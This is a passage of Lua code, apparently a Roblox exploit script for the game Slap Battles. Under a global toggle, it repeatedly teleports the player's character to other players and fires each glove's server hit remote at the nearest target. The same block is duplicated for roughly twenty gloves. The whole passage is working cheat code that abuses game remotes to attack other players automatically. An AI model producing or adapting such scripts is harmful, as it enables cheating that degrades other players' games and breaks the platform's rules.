elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Duelist" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").DuelistHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Woah" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").woahHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ice" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").IceHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Gummy" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Adios" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").hitAdios:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Blocked" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").BlockedHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Divert" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Engineer" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").engiehit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Rocky" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").RockyHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Coil" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HtStun:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Conveyor" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ConvHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Balloony" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HtStun:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Phantom" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").PhantomHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Wormhole" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").WormHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "STOP" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").STOP:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Track" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Tableflip" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Shield" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Booster" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ping Pong" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Baller" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Home Run" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Whirlwind" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
